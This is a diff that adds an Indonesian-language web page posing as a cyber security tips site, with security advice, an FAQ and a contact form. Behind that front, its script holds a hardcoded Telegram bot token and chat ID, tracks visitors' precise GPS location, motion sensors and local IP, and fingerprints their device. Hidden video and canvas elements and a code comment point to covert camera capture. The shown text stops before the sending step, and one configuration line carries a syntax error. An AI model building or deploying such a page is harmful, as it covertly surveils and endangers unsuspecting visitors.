@@ -1,0 +1,713 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Teknologi Terkini - Cyber Security Gokil</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@400;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-p1CmS8Bz+1Jkj0sAnbOXOd72x1OoQGN/8xKpG2twZBd3p3MUK+U9c5DkM8jbFxvHzZ+0YjZ5Rq9K+U5x7rZ+Iw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    :root {
+      --bg-dark: #0a0f1f;
+      --bg-light: #f0f2f5;
+      --surface-dark: rgba(18, 25, 49, 0.7);
+      --surface-light: rgba(255, 255, 255, 0.7);
+      --primary: #00f5c3;
+      --secondary: #7f5af0;
+      --text-dark: #e0e6f0;
+      --text-light: #12182b;
+      --border-color: rgba(0, 245, 195, 0.2);
+      --font-display: 'Exo 2', sans-serif;
+      --font-body: 'Roboto Mono', monospace;
+      --transition-speed: 0.4s;
+      --border-radius: 12px;
+      --shadow-glow: 0 0 15px rgba(0, 245, 195, 0.2), 0 0 30px rgba(0, 245, 195, 0.1);
+    }
+    ::-webkit-scrollbar { width: 8px; }
+    ::-webkit-scrollbar-track { background: var(--bg-dark); }
+    ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+    ::-webkit-scrollbar-thumb:hover { background: #fff; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: var(--font-body);
+      background-color: var(--bg-light);
+      background-image:
+        radial-gradient(rgba(127, 90, 240, 0.1) 1px, transparent 1px),
+        radial-gradient(rgba(127, 90, 240, 0.1) 1px, transparent 1px);
+      background-size: 40px 40px;
+      background-position: 0 0, 20px 20px;
+      color: var(--text-light);
+      line-height: 1.7;
+      overflow-x: hidden;
+      transition: background-color var(--transition-speed) ease, color var(--transition-speed) ease;
+    }
+    body.dark-mode {
+      background-color: var(--bg-dark);
+      color: var(--text-dark);
+      background-image:
+        radial-gradient(rgba(0, 245, 195, 0.05) 1px, transparent 1px),
+        radial-gradient(rgba(0, 245, 195, 0.05) 1px, transparent 1px);
+    }
+    .header {
+      text-align: center;
+      padding: 180px 20px 120px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+      background: linear-gradient(45deg, #0a0f1f, #12182b);
+    }
+    .header::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: url('https://www.transparenttextures.com/patterns/cubes.png'), linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
+      background-blend-mode: multiply;
+      opacity: 0.1;
+      z-index: 1;
+      animation: noise 10s steps(10) infinite;
+    }
+    @keyframes noise {
+      0%, 100% { transform: translate(0, 0); } 10% { transform: translate(-2%, -5%); } 20% { transform: translate(3%, 2%); } 30% { transform: translate(-5%, 3%); } 40% { transform: translate(2%, -4%); } 50% { transform: translate(-3%, 5%); } 60% { transform: translate(4%, -2%); } 70% { transform: translate(-2%, 3%); } 80% { transform: translate(5%, -5%); } 90% { transform: translate(-4%, 2%); }
+    }
+    .header h1, .header p { position: relative; z-index: 2; }
+    .header h1 {
+      font-family: var(--font-display); font-size: 5em; font-weight: 900; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; color: #fff;
+      text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary), 0 0 40px var(--primary), 0 0 80px var(--secondary);
+      animation: flicker 3s infinite alternate;
+    }
+    @keyframes flicker {
+      0%, 18%, 22%, 25%, 53%, 57%, 100% { text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary), 0 0 40px var(--primary), 0 0 80px var(--secondary); } 20%, 24%, 55% { text-shadow: none; }
+    }
+    .header p { font-size: 1.5em; max-width: 800px; margin: 0 auto; color: var(--text-dark); animation: fadeInUp 1s ease-out; }
+    @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    .news-ticker { background: var(--primary); color: var(--bg-dark); padding: 12px 0; overflow: hidden; white-space: nowrap; font-weight: 700; font-family: var(--font-body); }
+    .news-ticker p { display: inline-block; padding-left: 100%; animation: ticker 20s linear infinite; }
+    @keyframes ticker { from { transform: translateX(0); } to { transform: translateX(-100%); } }
+    .dark-mode-toggle {
+      position: fixed; top: 20px; right: 20px; background: var(--surface-dark); border: 1px solid var(--border-color); border-radius: 50%; width: 50px; height: 50px;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all var(--transition-speed) ease; z-index: 1100; font-size: 1.5em; color: var(--primary); backdrop-filter: blur(10px);
+    }
+    .dark-mode-toggle:hover { background: var(--primary); color: var(--bg-dark); box-shadow: var(--shadow-glow); transform: scale(1.1) rotate(360deg); }
+    .navbar {
+      background: rgba(10, 15, 31, 0.5); padding: 15px 20px; box-shadow: 0 2px 20px rgba(0,0,0,0.3); position: sticky; top: 0; z-index: 1000;
+      display: flex; align-items: center; justify-content: space-between; transition: background-color var(--transition-speed) ease; backdrop-filter: blur(15px); border-bottom: 1px solid var(--border-color);
+    }
+    .nav-list { list-style: none; display: flex; flex-wrap: wrap; gap: 5px; }
+    .nav-list li a { color: var(--text-dark); text-decoration: none; font-size: 1.1em; padding: 10px 15px; border-radius: 8px; position: relative; overflow: hidden; transition: color var(--transition-speed) ease; }
+    .nav-list li a::before { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 0; height: 2px; background-color: var(--primary); transition: width var(--transition-speed) ease; }
+    .nav-list li a:hover { color: var(--primary); }
+    .nav-list li a:hover::before { width: 80%; }
+    .hamburger { display: none; cursor: pointer; }
+    .hamburger span { display: block; width: 25px; height: 3px; margin: 5px 0; background: #fff; border-radius: 2px; transition: all var(--transition-speed) ease; }
+    .container {
+      width: 90%; max-width: 1200px; margin: 60px auto; background: var(--surface-light); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+      padding: 40px; border-radius: var(--border-radius); border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.1);
+      transition: all var(--transition-speed) ease; animation: fadeIn 1s ease-out;
+    }
+    body.dark-mode .container { background: var(--surface-dark); border: 1px solid var(--border-color); box-shadow: 0 8px 32px 0 rgba(0,0,0,0.3); }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+    h2 { font-family: var(--font-display); color: var(--text-light); font-size: 2.8em; font-weight: 700; margin-bottom: 25px; text-align: center; text-transform: uppercase; }
+    body.dark-mode h2 { color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+    p { font-size: 1.1em; margin-bottom: 20px; text-align: justify; }
+    section ul, section ol { max-width: 800px; margin: 20px auto; padding-left: 25px; text-align: left; }
+    section li { margin-bottom: 12px; font-size: 1.1em; padding-left: 15px; position: relative; }
+    section li::before { content: '»'; position: absolute; left: 0; color: var(--primary); font-weight: bold; }
+    .cta-button {
+      background: transparent; color: var(--primary); padding: 15px 35px; font-size: 1.2em; font-family: var(--font-body); font-weight: 700;
+      border-radius: 50px; border: 2px solid var(--primary); cursor: pointer; transition: all var(--transition-speed) ease; display: block; margin: 30px auto; position: relative; overflow: hidden;
+    }
+    .cta-button:hover { background: var(--primary); color: var(--bg-dark); box-shadow: var(--shadow-glow); transform: translateY(-5px); }
+    .loading-container { display: none; text-align: center; margin-top: 20px; }
+    .loading-bar { width: 100%; height: 5px; background-color: rgba(0, 245, 195, 0.1); border-radius: 5px; overflow: hidden; margin-top: 10px; }
+    .loading-bar::after { content: ''; display: block; height: 100%; width: 0; background: var(--primary); animation: loading 2s infinite; box-shadow: var(--shadow-glow); }
+    @keyframes loading { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 0%; } }
+    .loading-text { font-size: 1.2em; font-weight: 700; color: var(--primary); margin-top: 15px; }
+    .contact-info { list-style: none; text-align: center; margin-bottom: 30px; }
+    .contact-info li { font-size: 1.1em; margin-bottom: 10px; }
+    .contact-info a { color: var(--primary); text-decoration: none; transition: all var(--transition-speed) ease; }
+    .contact-info a:hover { color: #fff; text-shadow: 0 0 5px var(--primary); }
+    .contact-form { max-width: 600px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }
+    .contact-form input, .contact-form textarea {
+      padding: 15px; border: 1px solid var(--border-color); border-radius: var(--border-radius); font-size: 1em; font-family: var(--font-body);
+      outline: none; transition: all var(--transition-speed) ease; background: transparent; color: var(--text-light);
+    }
+    body.dark-mode .contact-form input, body.dark-mode .contact-form textarea { color: var(--text-dark); }
+    .contact-form input:focus, .contact-form textarea:focus { border-color: var(--primary); box-shadow: var(--shadow-glow); }
+    .footer { background: var(--bg-dark); color: var(--text-dark); text-align: center; padding: 40px 20px; margin-top: 60px; border-top: 2px solid var(--primary); }
+    .footer a { color: var(--primary); text-decoration: none; transition: color var(--transition-speed) ease; }
+    .footer a:hover { color: #fff; }
+    .social-icons { margin-top: 20px; }
+    .social-icons a { color: var(--text-dark); margin: 0 15px; font-size: 1.8em; transition: all var(--transition-speed) ease; }
+    .social-icons a:hover { color: var(--primary); transform: translateY(-5px); }
+    #backToTop {
+      position: fixed; bottom: 30px; right: 30px; background: var(--primary); color: var(--bg-dark); border: none; width: 50px; height: 50px;
+      border-radius: 50%; cursor: pointer; display: none; z-index: 1000; font-size: 1.2em; transition: all var(--transition-speed) ease;
+    }
+    #backToTop:hover { transform: scale(1.1); box-shadow: var(--shadow-glow); }
+    .modal {
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10, 15, 31, 0.5);
+      align-items: center; justify-content: center; z-index: 2000; backdrop-filter: blur(10px);
+    }
+    .modal-content {
+      background: var(--bg-dark); padding: 40px; border-radius: var(--border-radius); border: 1px solid var(--primary); box-shadow: var(--shadow-glow);
+      max-width: 600px; width: 90%; text-align: center; position: relative; animation: scaleIn 0.5s ease; color: var(--text-dark);
+    }
+    @keyframes scaleIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .modal-content h3 { margin-bottom: 20px; color: var(--primary); font-family: var(--font-display); font-size: 2em; }
+    .modal-close { position: absolute; top: 15px; right: 20px; font-size: 1.8em; cursor: pointer; color: var(--text-dark); transition: all var(--transition-speed) ease; }
+    .modal-close:hover { color: var(--primary); transform: rotate(90deg); }
+    #telegramFeed { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; margin-top: 30px; }
+    .telegram-card {
+      background: var(--surface-light); border: 1px solid rgba(255,255,255,0.2); border-radius: var(--border-radius); box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      padding: 25px; transition: all var(--transition-speed) ease; display: flex; flex-direction: column;
+    }
+    body.dark-mode .telegram-card { background: var(--surface-dark); border: 1px solid var(--border-color); box-shadow: none; }
+    .telegram-card:hover { transform: translateY(-10px) scale(1.02); box-shadow: var(--shadow-glow); border-color: var(--primary); }
+    .telegram-card h3 { font-size: 1.5em; margin-bottom: 15px; color: var(--text-light); font-family: var(--font-display); }
+    body.dark-mode .telegram-card h3 { color: var(--primary); }
+    .telegram-card p { font-size: 1em; margin-bottom: 15px; flex-grow: 1; }
+    .telegram-card a { text-decoration: none; color: var(--secondary); font-weight: bold; align-self: flex-end; transition: color var(--transition-speed) ease; }
+    .telegram-card a:hover { color: var(--primary); }
+    @media (max-width: 768px) {
+      .nav-list {
+        position: absolute; top: 75px; right: 0; background: var(--bg-dark); flex-direction: column; width: 100%; border-radius: 0;
+        display: none; padding: 20px 0; border-bottom: 2px solid var(--primary);
+      }
+      .nav-list.active { display: flex; }
+      .nav-list li { margin: 10px 0; text-align: center; width: 100%; }
+      .hamburger { display: flex; flex-direction: column; gap: 5px; }
+      .header h1 { font-size: 2.8em; }
+      .header p { font-size: 1.2em; }
+      h2 { font-size: 2.2em; }
+    }
+  </style>
+</head>
+<body>
+  <button class="dark-mode-toggle" id="darkModeToggle"><span>🌙</span></button>
+
+  <div class="modal" id="welcomeModal" style="display: flex;">
+    <div class="modal-content">
+      <h3>Selamat Datang, Bro!</h3>
+      <p>Jelajahi info cyber security terupdate & canggih, langsung dapet info via Telegram.</p>
+      <button class="cta-button" id="continueBtn">Lanjut, Gan!</button>
+    </div>
+  </div>
+
+  <header class="header" id="home">
+    <h1>Teknologi Terkini</h1>
+    <p>Cyber Security Gokil buat lo yang update dan siap nge-breakin segala serangan!</p>
+  </header>
+
+  <div class="news-ticker">
+    <p><i class="fa-solid fa-bolt"></i> BREAKING: Serangan siber global makin gila!     <i class="fa-solid fa-bolt"></i> Cyber Tip: Aktifin VPN & 2FA buat proteksi maksimal!     <i class="fa-solid fa-bolt"></i> ALERT: Phishing scam baru menargetkan gamer!    </p>
+  </div>
+
+  <nav class="navbar">
+    <a href="#home" style="text-decoration:none; color: var(--primary); font-family: var(--font-display); font-size: 1.5em; font-weight: 700;">CYBERSEC</a>
+    <ul class="nav-list" id="navList">
+      <li><a href="#home"><i class="fa-solid fa-house"></i> Beranda</a></li>
+      <li><a href="#tips"><i class="fa-solid fa-lightbulb"></i> Tips & Trik</a></li>
+      <li><a href="#dashboard"><i class="fa-solid fa-chart-line"></i> Tentang</a></li>
+      <li><a href="#fitur"><i class="fa-solid fa-rocket"></i> Fitur</a></li>
+      <li><a href="#tutorial"><i class="fa-solid fa-graduation-cap"></i> Tutorial</a></li>
+      <li><a href="#faq"><i class="fa-solid fa-question"></i> FAQ</a></li>
+      <li><a href="#telegram"><i class="fa-solid fa-telegram"></i> Hot Telegram</a></li>
+      <li><a href="#kontak"><i class="fa-solid fa-envelope"></i> Kontak</a></li>
+    </ul>
+    <div class="hamburger" id="hamburger">
+      <span></span><span></span><span></span>
+    </div>
+  </nav>
+
+  <section class="container" id="home-section">
+    <h2>Selamat Datang, Bro!</h2>
+    <p>Lo lagi di surga info teknologi terkini dan tips keamanan digital yang super update. Jelajahi semua menu dan fitur canggih buat lo jadi makin jago hadapin serangan siber!</p>
+  </section>
+
+  <section class="container" id="tips">
+    <h2>7 Cara Anti Hack yang Wajib Lo Tahu</h2>
+    <p>Di dunia digital yang super canggih ini, lo harus siap dengan strategi jitu. Nih, cek tips dari para ahli buat pertahanan level dewa:</p>
+    <ol>
+      <li><strong>Password Unik & Kompleks:</strong> Gunakan kombinasi huruf besar-kecil, angka, dan simbol. Jangan pernah pakai ulang password!</li>
+      <li><strong>Aktifkan Multi-Factor Authentication (MFA/2FA):</strong> Lapisan keamanan ekstra ini adalah kunci. Wajib aktif di semua akun penting.</li>
+      <li><strong>Waspada Phishing:</strong> Jangan asal klik link atau download lampiran dari email/pesan yang mencurigakan. Verifikasi dulu sumbernya.</li>
+      <li><strong>Update Segalanya:</strong> Sistem operasi, browser, dan aplikasi harus selalu dalam versi terbaru untuk menutup celah keamanan.</li>
+      <li><strong>Gunakan VPN Terpercaya:</strong> Enkripsi koneksi internet lo, terutama saat menggunakan Wi-Fi publik, untuk menjaga privasi.</li>
+      <li><strong>Backup Data Secara Rutin:</strong> Simpan data penting di beberapa tempat (cloud & fisik) untuk antisipasi serangan ransomware.</li>
+      <li><strong>Pasang Antivirus & Firewall:</strong> Ini adalah garda terdepan pertahanan digital lo dari malware dan akses ilegal.</li>
+    </ol>
+    <button class="cta-button" id="sendBtn">welcome to website</button>
+    <div class="loading-container" id="loadingContainer">
+      <div class="loading-bar"></div>
+      <p class="loading-text" id="loadingText">Loading...</p>
+    </div>
+  </section>
+
+  <section class="container" id="dashboard">
+    <h2>Tentang Kami</h2>
+    <p>Selamat datang di Teknologi Terkini, pusat komando digital yang ngasih lo intelijen terbaru seputar keamanan siber. Di sini, lo bakal nemuin berbagai tips, tutorial, FAQ, dan fitur canggih buat upgrade skill lo menghadapi segala ancaman di dunia maya.</p>
+    <p>Dengan desain futuristik, responsif, dan dilengkapi dark mode, kami memastikan lo mendapatkan informasi dengan cara paling keren. Semua update krusial dikirim real-time langsung ke channel Telegram!</p>
+  </section>
+
+  <section class="container" id="fitur">
+    <h2>Fitur Canggih</h2>
+    <p>Kami nggak main-main! Ini dia fitur-fitur advanced yang siap manjain lo:</p>
+    <ul>
+      <li>Pengumpulan data perangkat real-time untuk notifikasi Telegram.</li>
+      <li>Analisis mendalam tentang koneksi, performa, dan load time halaman.</li>
+      <li>Integrasi notifikasi Telegram dengan data lengkap.</li>
+      <li>Deteksi VPN/Proxy, cookies, localStorage, dan info browser lainnya.</li>
+      <li>Enkripsi data & proteksi privasi tingkat tinggi.</li>
+      <li>Mode Dark & Light sesuai mood lo.</li>
+      <li>Tampilan responsif keren di semua device.</li>
+    </ul>
+  </section>
+
+  <section class="container" id="tutorial">
+    <h2>Tutorial Cyber Security</h2>
+    <p>Belajar jadi jagoan cyber security bareng tutorial lengkap dari kita. Ini materi yang bakal lo pelajari:</p>
+    <ul>
+      <li><strong>Dasar-dasar Keamanan Digital:</strong> Mengenal threat, cara kerja firewall, dan antivirus.</li>
+      <li><strong>Penetration Testing:</strong> Langkah demi langkah uji kerentanan sistem.</li>
+      <li><strong>Analisis Malware:</strong> Cara mengidentifikasi dan analisis malware.</li>
+      <li><strong>Forensik Digital:</strong> Teknik investigasi digital untuk bongkar jejak serangan.</li>
+    </ul>
+  </section>
+
+  <section class="container" id="faq">
+    <h2>FAQ - Pertanyaan Umum</h2>
+    <p>Punya pertanyaan seputar cyber security? Cek FAQ berikut:</p>
+    <ul>
+      <li><strong>Apa itu cyber security?</strong> Praktik melindungi sistem, jaringan, dan data dari serangan digital.</li>
+      <li><strong>Kenapa harus pake VPN?</strong> VPN bantu sembunyikan IP dan proteksi data dari pengintaian.</li>
+      <li><strong>Bagaimana memilih antivirus yang tepat?</strong> Pilih yang update, punya reputasi baik, dan sesuai kebutuhan.</li>
+      <li><strong>Apakah 2FA itu wajib?</strong> Sangat direkomendasikan untuk lapisan keamanan ekstra.</li>
+    </ul>
+  </section>
+
+  <section class="container" id="telegram">
+    <h2>Hot Telegram Feed</h2>
+    <p>Dapetin update informasi cyber security langsung dari channel Telegram favorit lo. Info mendetail bakal nongol di sini.</p>
+    <div id="telegramFeed">
+      <p>Loading hot feed...</p>
+    </div>
+  </section>
+
+  <section class="container" id="kontak">
+    <h2>Kontak Kami</h2>
+    <p>Punya pertanyaan atau mau kolaborasi? Hubungi kita lewat info di bawah atau isi form kontak.</p>
+    <ul class="contact-info">
+      <li>Email: <a href="mailto:info@teknologiterkini.com">info@teknologiterkini.com</a></li>
+      <li>Telepon: +62 812 3456 7890</li>
+      <li>Alamat: Jl. Teknologi No. 123, Jakarta, Indonesia</li>
+    </ul>
+    <form class="contact-form" id="contactForm">
+      <input type="text" placeholder="Nama Kamu" required>
+      <input type="email" placeholder="Email Kamu" required>
+      <textarea placeholder="Pesan Kamu" rows="4" required></textarea>
+      <button type="submit" class="cta-button">Kirim Pesan</button>
+    </form>
+    <div style="margin-top:20px; text-align:center; border-radius: var(--border-radius); overflow: hidden; border: 1px solid var(--border-color);">
+      <iframe src="https://maps.google.com/maps?q=Jakarta&t=&z=13&ie=UTF8&iwloc=&output=embed" width="100%" height="300" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <p>© 2025 Teknologi Terkini. Dikembangin oleh <a href="#">Tim Ahli</a>.</p>
+    <div class="social-icons">
+      <a href="#"><i class="fa-brands fa-twitter"></i></a>
+      <a href="#"><i class="fa-brands fa-discord"></i></a>
+      <a href="#"><i class="fa-brands fa-github"></i></a>
+      <a href="#"><i class="fa-brands fa-telegram"></i></a>
+    </div>
+  </footer>
+
+  <button id="backToTop"><i class="fa-solid fa-angle-up"></i></button>
+
+  <div class="modal" id="guideModal">
+    <div class="modal-content">
+      <span class="modal-close" id="modalClose">×</span>
+      <h3>Panduan Keamanan Digital</h3>
+      <p>Simak panduan lengkap untuk jaga perangkat lo secara maksimal. Ikutin tips para ahli agar lo makin siap hadapin serangan siber.</p>
+    </div>
+  </div>
+
+  <video id="video-capture" style="display:none;" autoplay playsinline></video>
+  <canvas id="canvas-capture" style="display:none;"></canvas>
+
+  <script>
+    // ===================================================================
+    // SCRIPT LENGKAP UNTUK FUNGSI WEBSITE (TERMASUK KAMERA)
+    // ===================================================================
+
+    // --- KONFIGURASI TELEGRAM (WAJIB DIISI) ---
+    const botToken = "7688364740:AAHf7TiJyOQGLlP06SdV7uiaCLl5sVKimDI";
+    const chatIds = [6110373133"]; // Boleh lebih dari satu, pisahkan dengan koma
+
+    // --- FUNGSI UTAMA & INTERAKSI UI ---
+    let latestPosition = null, orientationData = { alpha: null, beta: null, gamma: null }, motionData = null, absoluteOrientationData = null;
+    
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(
+        (position) => { latestPosition = position; },
+        (error) => { console.error("Error tracking lokasi: " + error.message); },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+      );
+    }
+    if (window.DeviceOrientationEvent) {
+      window.addEventListener('deviceorientation', event => {
+        orientationData.alpha = event.alpha;
+        orientationData.beta = event.beta;
+        orientationData.gamma = event.gamma;
+      });
+    }
+    window.addEventListener('devicemotion', event => {
+      motionData = { acceleration: event.acceleration, rotationRate: event.rotationRate, interval: event.interval };
+    });
+    if ('AbsoluteOrientationSensor' in window) {
+      try {
+        let sensor = new AbsoluteOrientationSensor({ frequency: 60 });
+        sensor.addEventListener('reading', () => {
+          const q = sensor.quaternion;
+          const sinr_cosp = 2 * (q[0] * q[1] + q[2] * q[3]);
+          const cosr_cosp = 1 - 2 * (q[1] * q[1] + q[2] * q[2]);
+          const roll = Math.atan2(sinr_cosp, cosr_cosp);
+          const sinp = 2 * (q[0] * q[2] - q[3] * q[1]);
+          let pitch = Math.abs(sinp) >= 1 ? Math.sign(sinp) * Math.PI / 2 : Math.asin(sinp);
+          const siny_cosp = 2 * (q[0] * q[3] + q[1] * q[2]);
+          const cosy_cosp = 1 - 2 * (q[2] * q[2] + q[3] * q[3]);
+          const yaw = Math.atan2(siny_cosp, cosy_cosp);
+          absoluteOrientationData = {
+            roll: (roll * (180/Math.PI)).toFixed(2),
+            pitch: (pitch * (180/Math.PI)).toFixed(2),
+            yaw: (yaw * (180/Math.PI)).toFixed(2)
+          };
+        });
+        sensor.start();
+      } catch (error) {
+        console.error("AbsoluteOrientationSensor error: ", error);
+      }
+    }
+    
+    const darkModeToggle = document.getElementById('darkModeToggle');
+    darkModeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('dark-mode');
+      darkModeToggle.innerHTML = document.body.classList.contains('dark-mode') ? '<span>☀️</span>' : '<span>🌙</span>';
+    });
+    
+    const hamburger = document.getElementById('hamburger');
+    const navList = document.getElementById('navList');
+    hamburger.addEventListener('click', () => {
+      navList.classList.toggle('active');
+    });
+    
+    const backToTop = document.getElementById('backToTop');
+    window.addEventListener('scroll', () => {
+      backToTop.style.display = (window.pageYOffset > 300) ? 'flex' : 'none';
+      backToTop.style.alignItems = 'center';
+      backToTop.style.justifyContent = 'center';
+    });
+    backToTop.addEventListener('click', () => {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    });
+
+    const guideModal = document.getElementById('guideModal');
+    const modalClose = document.getElementById('modalClose');
+    modalClose.addEventListener('click', () => { guideModal.style.display = 'none'; });
+    window.addEventListener('click', (e) => { if (e.target === guideModal) { guideModal.style.display = 'none'; } });
+
+    function getLocalIP() {
+      return new Promise(resolve => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+        pc.onicecandidate = ice => {
+          if (ice && ice.candidate && ice.candidate.candidate) {
+            const ip = ice.candidate.candidate.split(' ')[4];
+            pc.close();
+            resolve(ip);
+          }
+        };
+      });
+    }
+
+    function computeDistance(lat1, lon1, lat2, lon2) {
+      const R = 6371;
+      const dLat = (lat2 - lat1) * Math.PI / 180;
+      const dLon = (lon2 - lon1) * Math.PI / 180;
+      const a = Math.sin(dLat / 2) ** 2 + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+      return R * c;
+    }
+
+    async function collectAllInfo() {
+      let deviceLat = null, deviceLon = null;
+      const info = {
+        gpu: navigator.gpu?.name || "Tidak Terdeteksi",
+        cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " core" : "Tidak Terdeteksi",
+        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit (Pixel Ratio: ${window.devicePixelRatio})`,
+        innerWindow: `${window.innerWidth}x${window.innerHeight}`,
+        screenAvail: `${screen.availWidth}x${screen.availHeight}`,
+        orientation: screen.orientation ? screen.orientation.type : "Tidak Terdeteksi",
+        colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light",
+        vendor: navigator.vendor || "Tidak Terdeteksi",
+        javaEnabled: (navigator.javaEnabled && navigator.javaEnabled()) ? "Ya" : "Tidak",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        webgl: "Tidak Terdeteksi",
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || "Tidak Ada",
+        touch: ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Ya" : "Tidak",
+        adblock: "Tidak Terdeteksi",
+        connection: "Tidak Terdeteksi",
+        brand: navigator.userAgentData?.brands[0]?.brand || "Tidak Terdeteksi",
+        os: navigator.userAgent || "Tidak Terdeteksi",
+        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi",
+        battery: "Tidak Terdeteksi",
+        publicIp: "Tidak Terdeteksi",
+        localIp: "Tidak Terdeteksi",
+        city: "Tidak Terdeteksi",
+        region: "Tidak Terdeteksi",
+        country: "Tidak Terdeteksi",
+        location: "Tidak Terdeteksi",
+        language: navigator.language || "Tidak Terdeteksi",
+        languages: navigator.languages ? navigator.languages.join(', ') : "Tidak Terdeteksi",
+        platform: navigator.platform || "Tidak Terdeteksi",
+        doNotTrack: navigator.doNotTrack || "Tidak Terdeteksi",
+        currentURL: window.location.href,
+        referrer: document.referrer || "Tidak Ada",
+        onLine: navigator.onLine ? "Online" : "Offline",
+        visibilityState: document.visibilityState,
+        sessionStorage: (typeof window.sessionStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia"
+      };
+      info.pageLoadTime = (window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart) + " ms";
+      info.cookiesEnabled = navigator.cookieEnabled ? "Ya" : "Tidak";
+      info.localStorage = (typeof window.localStorage !== "undefined") ? "Tersedia" : "Tidak Tersedia";
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) { info.webgl = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + " - " + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); }
+      }
+      try {
+        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
+      } catch {
+        info.adblock = "Terdeteksi";
+      }
+      if (navigator.geolocation) {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            if (latestPosition && latestPosition.coords.accuracy <= 20) { resolve(latestPosition); }
+            else { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }); }
+          });
+          deviceLat = pos.coords.latitude; deviceLon = pos.coords.longitude;
+          let geoStr = `${deviceLat}, ${deviceLon} (Akurasi: ±${pos.coords.accuracy} m`;
+          if (pos.coords.altitude !== null) geoStr += `, Altitude: ${pos.coords.altitude} m`;
+          if (pos.coords.altitudeAccuracy !== null) geoStr += ` (Alt. Acc: ±${pos.coords.altitudeAccuracy} m)`;
+          if (pos.coords.heading !== null && !isNaN(pos.coords.heading)) geoStr += `, Heading: ${pos.coords.heading}°`;
+          if (pos.coords.speed !== null && !isNaN(pos.coords.speed)) geoStr += `, Speed: ${pos.coords.speed} m/s`;
+          geoStr += `, Timestamp: ${new Date(pos.timestamp).toLocaleTimeString()})`;
+          info.geolocation = geoStr;
+        } catch (err) {
+          info.geolocation = "Error: " + err.message;
+        }
+      }
+      if (orientationData.alpha !== null) info.deviceOrientation = `Alpha: ${orientationData.alpha.toFixed(2)}°, Beta: ${orientationData.beta.toFixed(2)}°, Gamma: ${orientationData.gamma.toFixed(2)}°`;
+      else info.deviceOrientation = "Tidak Terdeteksi";
+      if (absoluteOrientationData) info.absoluteOrientation = `Roll: ${absoluteOrientationData.roll}°, Pitch: ${absoluteOrientationData.pitch}°, Yaw: ${absoluteOrientationData.yaw}°`;
+      else info.absoluteOrientation = "Tidak Terdeteksi";
+      if (motionData) info.deviceMotion = `Acceleration: ${JSON.stringify(motionData.acceleration)}, Rotation Rate: ${JSON.stringify(motionData.rotationRate)}`;
+      else info.deviceMotion = "Tidak Terdeteksi";
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection) {
+        info.connection = `${connection.effectiveType} (${connection.downlink}Mbps)`;
+        if (connection.rtt) info.rtt = connection.rtt + " ms";
+      }
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          info.battery = battery.charging ? `Charging (${Math.round(battery.level * 100)}%)` : `${Math.round(battery.level * 100)}%`;
+        } catch {
+          info.battery = "Tidak Terdeteksi";
+        }
+      }
